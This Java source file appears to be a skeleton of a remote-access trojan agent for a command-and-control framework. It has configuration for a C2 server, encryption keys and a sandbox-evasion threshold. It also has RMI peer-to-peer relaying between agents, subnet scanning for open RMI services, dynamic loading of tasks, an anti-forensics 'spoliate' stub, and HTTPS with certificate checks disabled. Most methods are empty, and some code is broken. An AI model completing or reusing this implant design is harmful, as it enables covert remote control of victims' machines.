package com.nocebo.nCore;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileReader;
import java.io.StringWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.StringReader;
import java.lang.management.ManagementFactory;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;
import java.util.Base64;
import java.util.Arrays;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;

import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.security.InvalidAlgorithmParameterException;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import javax.crypto.IllegalBlockSizeException;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URI;
import java.net.URISyntaxException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.security.spec.AlgorithmParameterSpec;
import java.text.SimpleDateFormat;
import java.security.InvalidKeyException;
import java.util.List;
import java.awt.HeadlessException;
import java.awt.Toolkit;




class iAgent
{

    public static class nConfig
    {
        public static String defaultKey = "";
        public static String encKey = "";
        public static String server = "";
        public static int isDownstream = 0;
        public static String upstreamSvc = "";
        public static String upstreamHost = "null";
        public static int upstreamPort = 0;
        public static int virtThreshold = 0; //6 for when it's ready
        public static String passMat = "";
        public static Hashtable endpoints = new Hashtable();
    }
    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java -d ..\server\fileroot
    //ephemerals
    static public int shutdown = 0;
    static public String cookieData = "null";
    static public String sessUUID = "";
    static public String nonce = "";
    static public ArrayList p2pList = new ArrayList();
    static public ArrayList tasks = new ArrayList();
    static public Hashtable downstreamAgents = new Hashtable();
    static public ArrayList output = new ArrayList();
    static private countermeasures cm = new countermeasures();
    static public utilitarian nUtil = new utilitarian();
    static private pkgLib packager = new pkgLib();
    static private nConfig config = new nConfig();
    static public network nComm = new network();
    static public P2PInterface ifaceP2P = null;
    static private security secInst = new security();

    public static void main(String[] args)
    {
        TimeUnit.MILLISECONDS.sleep(30 * 1000);
        init();
    }

    public static void init() throws RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        
    }

    public static void keepalive() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        
    }

    public static void react() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        
    }

    public static void threader(Class classData, Method methodData, String[] args)
    {
        
    }

    public static void send() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        
    }


    public static class runnableThread implements Runnable
    {
        static Class rClass;
        static Method rMethod;
        static Object rArgs;

        public runnableThread(Class classData, Method methodData, String[] args)
        {
            rClass = classData;
            rMethod = methodData;
            rArgs = args;
        }

        public void run()
        {
            
        }
    }

    private static class pkgLib extends ClassLoader {
        private Class load(String className, String classical)
        {
            return new Class();
        }
    }

    public static class utilitarian
    {
	
        public static String streamToString(InputStream iStream)
        {
            return new String();
        }

	    public static int rngenerator(int min, int max) throws NoSuchAlgorithmException 
        {
		    return 0;
	    }

		public String strand(int strLen) throws NoSuchAlgorithmException {
			//random string, for nonces and such
			return new String();
		}

        private ArrayList getClassByName(String className)
        {
            return new ArrayList();
        }

        private Hashtable getMethodByName(Class cData, String methodName) throws ClassNotFoundException
        {
            return new Hashtable();
        }

        public Hashtable xmlStringToParseable(String input) throws ParserConfigurationException, IOException, SAXException
        {
            return new Hashtable();
        }

        public String xmlDocToString(Document xmlDoc) throws TransformerException
        {
            return new String();
        }

        //copied from my old RAT project, lycanthropy
        public String getHostname() throws UnknownHostException {
            return new String();
        }
        
        //copied from my old RAT project, lycanthropy
        public Hashtable getAddress() throws SocketException {
            return new Hashtable();
        }
    }

    public static class P2PServer
    {
        public void rmiServer() throws Exception, RemoteException
        {
            Registry nRegistry = LocateRegistry.createRegistry(config.upstreamPort);

            P2PInterface srvObj = new P2PSrvImpl();
            nRegistry.rebind(config.upstreamSvc, (Remote) srvObj);
        }
    }

    public interface P2PInterface extends Remote
    {
        //creates cookie session object and adds uuid to downstream agents
        public Hashtable auth(String uuid, String passwd, ArrayList downstream, String nonce) throws RemoteException, Exception;
        public String put(String uuid, String cookie, String nonce, Document data) throws RemoteException, Exception;
        //stop being a downstream agent, need to make sure tasking prioritizes checking upstream agents for a uuid before swapping to downstream
        public String disconnect(String uuid, String cookie, String nonce) throws RemoteException, Exception;
    }

    public static class P2PSrvImpl extends UnicastRemoteObject implements P2PInterface
    {

        P2PSrvImpl() throws RemoteException
        {
            super();
        }

        public Hashtable auth(String uuid, String passwd, ArrayList downstream, String downstreamNonce) throws RemoteException, Exception
        {
            return new Hashtable();
        }

        public String put(String uuid, String cookie, String downstreamNonce, Document data) throws Exception, RemoteException
        {
            return new String();
        }

        public String disconnect(String uuid, String cookie, String downstreamNonce) throws Exception, RemoteException
        {
            return new String();
        }


        public String mkCookie(String uuid, String passMat) throws NoSuchAlgorithmException
        {
            return new String();
        }
    }


    public static class network
    {
        public ArrayList initP2PInterface()
        {
            return new ArrayList();
        }

        public ArrayList findOpenRMI(ArrayList addresses)
        {
            return new ArrayList();
        }

        public ArrayList calcSubnetAddrs(ArrayList ipAddresses)
        {
            
            return new ArrayList();
        }

        public ArrayList findP2P() throws SocketException
        {
            
            return new ArrayList();
        }

        private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            return new String();

        }

        private String request(String postData, String endpointType) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
        {
           

                HostnameVerifier allHostsValid = new HostnameVerifier() {
                    public boolean verify(String hostname, SSLSession session) {
                     return true;
                   }
                };
                return new String();
        }

    
        //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
        public class InvalidCertificateTrustManager implements X509TrustManager{
            @Override
            public X509Certificate[] getAcceptedIssuers() {
                return null;
            }

            @Override
            public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {

            }

            @Override
            public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
            }
        }
    }

    private static class countermeasures 
    {
        private void spoliate()
        {

        }
    }

    static class security
    {
        //replicates my lycanthropy aesgcm
        public byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            SecretKey key = initKey(keyData);
            Cipher cipher = initCipher();

            AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
            cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
            return cipher.doFinal(plaintext);
        }

        public byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            SecretKey key = initKey(keyData);
            Cipher cipher = initCipher();

            AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
            cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
            return cipher.doFinal(encrypted);
        }

        private Cipher initCipher() throws Exception
        {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            return cipher;
        }

        private SecretKey initKey(byte[] keyBytes) throws Exception
        {
            SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
            return key;
        }
    }
}